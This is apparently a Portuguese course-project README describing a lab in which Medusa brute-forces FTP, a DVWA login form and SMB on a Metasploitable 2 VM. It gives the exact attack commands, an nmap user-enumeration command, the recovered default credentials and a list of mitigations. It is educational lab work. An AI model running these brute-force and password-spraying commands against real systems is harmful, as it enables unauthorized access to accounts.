# 🔐 Brute Force Lab — Kali Linux + Medusa

Projeto prático do curso de Cibersegurança da DIO, simulando ataques 
de força bruta em ambiente controlado e isolado, utilizando Kali Linux, 
Medusa e Metasploitable 2.

>  **Aviso Legal:** Todos os testes foram realizados exclusivamente 
> em ambiente isolado e controlado, com fins educacionais. 
> Nunca execute esses testes em sistemas sem autorização.

---

##  Ferramentas Utilizadas

- **Kali Linux** — Sistema operacional para testes de segurança
- **Metasploitable 2** — VM vulnerável usada como alvo
- **Medusa** — Ferramenta de força bruta
- **DVWA** — Aplicação web vulnerável para testes
- **Nmap** — Scanner de rede e enumeração
- **VirtualBox** — Virtualização das máquinas

---

##  Configuração do Ambiente

- Duas VMs configuradas no VirtualBox
- Rede Host-Only (isolada) para comunicação entre as VMs
- Kali Linux como máquina atacante
- Metasploitable 2 como máquina alvo (IP: 192.168.56.101)

---

## Cenário 1 — Força Bruta em FTP

### Objetivo
Descobrir credenciais válidas do serviço FTP rodando no Metasploitable 2.

### Wordlists utilizadas
- `user.txt` — lista de usuários
- `pass.txt` — lista de senhas

### Comando executado
```bash
medusa -h 192.168.56.101 -U user.txt -P pass.txt -M ftp -t 4
```

### Resultado
O Medusa identificou credenciais válidas com sucesso.

![FTP Brute Force](images/ftp-attack.png)

###  Mitigação
- Limitar tentativas de login por IP
- Desativar FTP e usar SFTP no lugar
- Usar senhas fortes e únicas
- Implementar autenticação por chave SSH

---

##  Cenário 2 — Força Bruta em Formulário Web (DVWA)

### Objetivo
Automatizar tentativas de login no formulário web do DVWA 
usando o Medusa.

### Configuração
- DVWA com nível de segurança: **Low**
- Página alvo: `/dvwa/login.php`

### Wordlists utilizadas
- `user.txt` — lista de usuários
- `pass.txt` — lista de senhas

### Comando executado
```bash
medusa -h 192.168.56.101 -U user.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```

### Resultado
O Medusa encontrou as seguintes credenciais válidas:

| Usuário | Senha | Status |
|---|---|---|
| msfadmin | password | ✅ SUCCESS |
| admin | password | ✅ SUCCESS |

![DVWA Brute Force](images/dvwa-attack.png)

###  Mitigação
- Implementar CAPTCHA no formulário de login
- Bloquear IP após tentativas excessivas
- Usar autenticação de dois fatores (2FA)
- Implementar tempo de espera entre tentativas

---

##  Cenário 3 — Password Spraying em SMB

### Objetivo
Enumerar usuários e realizar password spraying no serviço SMB.

### Comando de enumeração
```bash
nmap -p 445 --script smb-enum-users 192.168.56.101
```

### Comando de ataque
```bash
medusa -h 192.168.56.101 -U user.txt -P pass.txt -M smbnt -t 4
```

### Resultado
Usuários enumerados e credenciais descobertas via SMB.

![SMB Attack](images/smb-attack.png)

###  Mitigação
- Desativar SMBv1
- Bloquear porta 445 no firewall para acesso externo
- Usar senhas complexas e únicas
- Monitorar logs de autenticação

---

##  Aprendizados

- Compreendi na prática como funcionam ataques de força bruta 
  em diferentes serviços (FTP, Web, SMB)
- Aprendi a utilizar o Medusa para auditoria em ambiente controlado
- Entendi a importância de wordlists e como elas afetam o resultado
- Reconheci vulnerabilidades comuns e suas respectivas mitigações
- Documentei processos técnicos de forma clara e estruturada

---

##  Estrutura do Repositório
```
brute-force-lab-medusa/
├── README.md
├── wordlists/
│   ├── user.txt
│   └── pass.txt
└── images/
    ├── ftp-attack.png
    ├── dvwa-attack.png
    └── smb-attack.png
```
